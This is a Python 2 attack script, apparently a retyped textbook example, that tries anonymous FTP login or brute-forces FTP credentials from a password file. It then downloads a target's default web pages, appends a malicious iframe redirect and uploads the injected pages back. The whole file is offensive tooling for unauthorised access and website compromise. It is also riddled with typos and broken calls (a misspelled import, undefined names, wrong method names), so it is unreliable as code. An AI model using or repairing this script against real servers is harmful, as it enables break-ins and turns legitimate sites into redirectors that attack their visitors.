import ftplib
import porparse
import time
def anonlogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous','me@your.com')
        print '\n[*]'+str(hostname)+'FTP Anonymous Logon Succeeded'
        ftp.quit()
        return True
    except Exception,e:
        print '\n[-]'+str(hostname)+'FTP Anonymous Login Failed'
        return False
def brutelogin(hostname,passwdFile):
    pF = open(passwdFile,'r')
    for line in pF.readlines():
        time.sleep(1)
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print '[+]Trying :'+userName+'/'+passWord
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName,passWord)
            print '\n[*]'+str(hostname)+'/'+passWord
            ftp.quit()
            return (userName,passWord)
        except Exception,e:
            pass
    print '\n[-]Could not brute force FTP credenrials'
    return (None,None)
def returnDefualt(ftp):
    try:
        dirlist =ftp.nlst()
    except:
        dirlist = []
        print '[-]Could not list directory contents'
        print '[-] Skipping To Next Target'
        return
    retlist = []
    for fileName in dirlist:
        fn = fileName.lower()
        if '.php' in fn or 'htm' in fn or '.asp' in fn:
            print '[+]Found default page:'+fileName
        retlist.append(fileName)
    return retlist
def injectPage(ftp,page,redirect):
    f = open(page+'.tmp','w')
    ftp.reytlines('RETR'+page,f.write)
    print '[+]Downloaded Page:'+page
    f.write(redirecy)
    f.close()
    print '[+]Injected Malicious IFrame on:'+page
    ftp.storlines('STOR'+page.open(page+'.tmp'))
    print '[+]Uploaded Injected Page:'+page
def attack(username,password,tgtHost,redirect):
    ftp = ftplib.FTP(tgtHost)
    ftp.login(username,password)
    defPages= returnDefualt(ftp)
    for defPage in defPages:
        injectPage(ftp,defPage,redirect)
def main():
    parser = optparse.OptionParser('usage%prog'+'-H <target host[s] -r <refirect page>'+'[-f <userpass file>]')
    parser.add_option('-H',dest='tgtHosts',type='string',help='specify target host')
    parser.add_option('-f',dest='passwdFile',type='string',help='specify user/pasword file')
    parser.add_option('-r',dest='redirect',type='string',help ='specify a redirection page')
    (options,args) = parser.parse_args()
    tgtHosts = str(options.tgtHosts).split('.')
    passwdFile = options.passwdFile
    redirect = options.redirect
    if tgtHosts==None or redirect ==None:
        print parser.usage
        exit(0)
    for tgtHost in tgtHosts:
        username = None
        password = None
        if anonloin(tgtHost) == True:
            username = 'anonymous'
            password = 'me@your.com'
            print '[+]Using Anonymous Creds to attack'
            attack(usernmae,password,tgtHost,redirect)
        elif passwdFile != None:
            (username,password) = \
            brutelogin(tgtHost,passwdFile)
        if password != None:
            print '[+] Using Creds:'+username+'/'+password+'to attack'
            attack(username,password,tgtHost,redirect)
if __name__ == '__main__':
    main()